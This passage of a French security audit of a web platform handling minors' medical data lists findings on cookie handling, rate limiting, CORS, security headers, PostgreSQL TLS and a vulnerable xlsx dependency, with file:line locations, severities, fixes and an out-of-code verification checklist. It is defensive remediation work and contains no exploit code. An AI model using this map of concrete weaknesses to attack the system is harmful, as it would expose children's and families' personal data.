transitif n'est pas évalué ici. Le point dur identifiable à l'œil est `xlsx@0.18.5`.

**Fix recommandé.** (1) Remplacer `xlsx` par la build maintenue SheetJS (CDN) ou par une alternative
(`exceljs`), et n'analyser les fichiers tableur que côté serveur, isolé. (2) Lancer
`npm audit --production` sur back **et** front, traiter les High/Critical. (3) Dependabot/renovate +
`npm audit` en CI. Estimation : **0,5 j** (xlsx) + audit continu.

---

### E8. INCERTAIN — TLS PostgreSQL : non forçable depuis le code (datasource sans `url`/`sslmode`)

**FAIT.** `prisma/schema.prisma:10-12` : `datasource db { provider = "postgresql" }` — **aucune
ligne `url`**, **aucun `sslmode`**. La connexion passe par le **driver adapter** `@prisma/adapter-pg`
(`PrismaPg` + `DATABASE_URL`, cf. CLAUDE.md / `package.json:41`). Le forçage SSL dépend donc
**entièrement** du `DATABASE_URL` (paramètre `?sslmode=require`/`?ssl=true`) et de la config `pg`,
**non présents dans le repo**.

**INTERPRÉTATION.** **NON VÉRIFIABLE DEPUIS LE CODE.** Sur Scalingo, la DB managée et l'app sont
généralement sur le réseau interne ; le chiffrement en transit dépend du `DATABASE_URL` fourni et de
l'option SSL du pool `pg`. À confirmer hors-code (checklist). Si la connexion est en clair sur un
segment réseau non fiable → exposition des données mineurs/IBAN en transit.

**Fix recommandé.** S'assurer que `DATABASE_URL` impose `sslmode=require` (ou `verify-full` avec CA
Scalingo) et que le pool `pg` est configuré `ssl: { rejectUnauthorized: true }`. Estimation : **0,25 j**
(config/env, à valider hors-code).

---

### Tableau récapitulatif — Section E

| # | Vulnérabilité | `fichier:ligne` | Sévérité | Fix (estim.) |
|---|---|---|---|---|
| E2 | `trust proxy` non configuré → throttle keyé sur l'IP proxy = compteur global (neutralise B/C + DoS) | `main.ts:7` (absence) ; `app.module.ts:40-44` | **HAUTE** | `app.set('trust proxy', 1)` + test IP (0,25 j) |
| E3 | JWT en cookie **non-httpOnly + sans `secure`** (incohérent) → volable par tout XSS, 7 j | `api.ts:12-15` ; `AuthContext.tsx:23,152` ; `callback/page.tsx:60` ; vs `login/actions.ts:59-65` | **HAUTE** | Cookie httpOnly+secure serveur + withCredentials (1–1,5 j) |
| E1 | Aucun header de sécurité (Helmet absent backend ; pas de `headers()` Next) | `main.ts:1-59` ; `next.config.ts:1-38` ; `package.json` (helmet absent) | MOYENNE | Helmet + `headers()` Next (0,5–1 j) |
| E4 | CORS : `credentials:true` global, `CORS_ORIGIN` non contraint, commentaire « Railway » obsolète | `main.ts:19-50` | MOYENNE | Contraindre origines + corriger commentaire (0,25 j) |
| E5 | `/api/contact` : public, sans rate-limit, injection HTML email, clé Brevo dans le front | `frontend/app/api/contact/route.ts:3-39` | MOYENNE | Rate-limit + CAPTCHA + escape + via backend (0,5 j) |
| E7 | `xlsx@0.18.5` (prototype pollution / ReDoS) ; `npm audit` à lancer | `frontend/package.json:26` | MOYENNE | Remplacer xlsx + `npm audit` CI (0,5 j) |
| E8 | TLS PostgreSQL non forçable depuis le code (datasource sans `sslmode`) | `prisma/schema.prisma:10-12` | INCERTAIN | Forcer `sslmode=require` (0,25 j, hors-code) |
| E6 | Pas de `middleware.ts` (protection routes client-only ; données API-gated) | `frontend/` (absence) | INFO | `middleware.ts` defense-in-depth (0,25 j) |

**Faits rassurants confirmés (FAIT) :** whitelist CORS sans wildcard en dur (E4) ; magic link en
fragment `#` effacé de l'URL (E3) ; **lockfiles commités** (builds reproductibles, E7) ; dépendances
globalement récentes (Next 16 post-CVE bypass middleware, E7) ; données sensibles **API-gated** (E6).
**Priorité de remédiation Section E : E2 → E3 → E1 → E4/E5/E7 → E8 → E6.**

---

## CHECKLIST FINALE CONSOLIDÉE — points NON VÉRIFIABLES DEPUIS LE CODE (Sections A→E)

> Fusion dédupliquée des checklists des Sections A, B, C, D et E. **Les sections d'origine ne sont
> pas modifiées.** Référence de provenance entre crochets `[A]`/`[B]`/`[C]`/`[D]`/`[E]`. À valider
> par Théo hors-code (env/dashboard Scalingo, OVH, Brevo, DNS, git history).

**1. Stockage objet OVH S3 (le plus critique pour les données mineurs)**
- [ ] **Policy ACL réelle du bucket** : les objets `public_read` sont-ils réellement world-readable ?
  Le bucket lui-même est-il en listing/lecture publique ? Si le bucket est privé malgré l'ACL objet,
  A0 chute fortement. `[A]`
- [ ] **`ListObjects` public désactivé ?** (sinon énumération des fichiers médicaux sans l'UUID). `[A]`
- [ ] **`S3_PUBLIC_URL`** : CDN/endpoint avec couche d'auth, ou accès direct au bucket ? `[A]`

**2. En-têtes de sécurité déployés (Scalingo / proxy amont)**
- [ ] **HSTS, CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy: no-referrer`,
  Permissions-Policy** réellement injectés en amont ? (le code n'en pose aucun — E1). Impact direct
  sur A0 (fuite Referer S3), D3 (XSS href), D5 (sniffing MIME), E3 (cookie non-secure). `[A][B][D][E]`
- [ ] **WAF / limite de taille body multipart** au reverse-proxy (atténue le DoS mémoire upload D5
  avant Node). `[D]`

**3. Réseau, transport, secrets d'environnement**
- [ ] **TLS PostgreSQL** : `DATABASE_URL` impose-t-il `sslmode=require` ? Pool `pg` en SSL ? (E8) `[E]`
- [ ] **`CORS_ORIGIN`** (env Scalingo) : valeur exacte, jamais `*` ni trop large (E4). `[E]`
- [ ] **IP source réelle vue par le backend** derrière Scalingo (confirme l'impact `trust proxy` E2). `[E]`
- [ ] **Gestion/rotation des secrets** `S3_SECRET_ACCESS_KEY`, `JWT_SECRET`, `DATABASE_URL`,
  `BREVO_API_KEY` (présente aussi dans l'app **frontend** via /api/contact — E5) côté env Scalingo. `[A][E]`
- [ ] **Rotation/robustesse de `JWT_SECRET`** (longueur, unicité par environnement). `[B]`

**4. Secrets dans le dépôt / historique git**
- [ ] **IBAN commités** (`contrat-sauvageon.pdf.tsx:188`, `INDEX_JURIDIQUE.md:35`) : réels/actifs ?
  Prévenir les partenaires ; décider de la réécriture d'historique. Repo déjà cloné par des tiers ? `[D]`
- [ ] **Scan de l'historique git complet** (`gitleaks detect`) : une clé S3/Brevo/JWT a-t-elle été
  commitée puis retirée dans le passé ? (le scan d'audit ne couvre que l'état actuel). `[D]`

**5. Logs (Scalingo)**
- [ ] **Qui accède aux logs** (dashboard/CLI) et **rétention** ? Les **tokens loggés**
  (`accompagnateur.service.ts:44` lien magique, corps emails `email.service.ts:80/441`) y sont-ils
  exposés ? Vérifier l'absence d'URL S3 médicale dans les logs d'erreur. `[A][D]`

**6. Authentification & comptes (vérifs comportementales hors-code)**
- [ ] **`POST /auth/register` atteignable en prod ?** (WAF/proxy ne le bloque pas) — même si l'UI ne
  l'utilise pas. (B0 corrigé côté code, mais confirmer l'exposition.) `[B]`
- [ ] **Effet exact de `refuserHebergeur`** : suppression de l'user vs `compteValide:false` ? Détermine
  si un JWT existant survit à la suspension (B1). `[B]`
- [ ] **MFA/2FA pour les comptes ADMIN** : géré hors-code (SSO/proxy) ou absent ? (C7) `[C]`
- [ ] **Journal d'audit des actions admin** (`updateUtilisateur`, `validerHebergeur`…) : existe-t-il
  hors code applicatif ? (C7) `[C]`
- [ ] **Usage métier d'un `Membership MEMBRE`** : confère-t-il un accès lecture aux séjours/centres de
  l'organisation ? (tranche la sévérité de B8) `[B]`

**7. Anti-abus / délivrabilité**
- [ ] **CAPTCHA / anti-bot** sur `/public/demande`, `/api/contact` et les formulaires d'inscription
  (non visible dans le code — C5/E5). `[C][E]`
- [ ] **Réputation d'envoi Brevo** : un email-bombing via `/public/demande` ou `/api/contact`
  dégrade-t-il la délivrabilité du domaine ? (C5/E5) `[C][E]`
- [ ] **Statut réel des centres exposés par `/public/centres`** : combien de centres `PENDING`
  (non validés) sont effectivement publiés ? (C4) `[C]`

**8. Dépendances**
- [ ] **`npm audit --production`** (backend + frontend) : CVE transitives non évaluables en lecture
  seule. Traiter en priorité `xlsx@0.18.5` (prototype pollution / ReDoS — E7). `[D][E]`

**9. Conformité RGPD (données mineurs — non dérivable du code seul)**
- [ ] **Registre des traitements**, base légale, **durée de rétention** officielle, **DPO** désigné. `[A]`
- [ ] **Consentement parental effectif** : `rgpdAccepte`/`consentementMedical` adossés à un recueil
  conforme (CGU versionnées, preuve) ? `[A]`
- [ ] **DPA signés** avec OVH et Brevo (sous-traitants) ; **localisation** des données Brevo. `[A]`

---
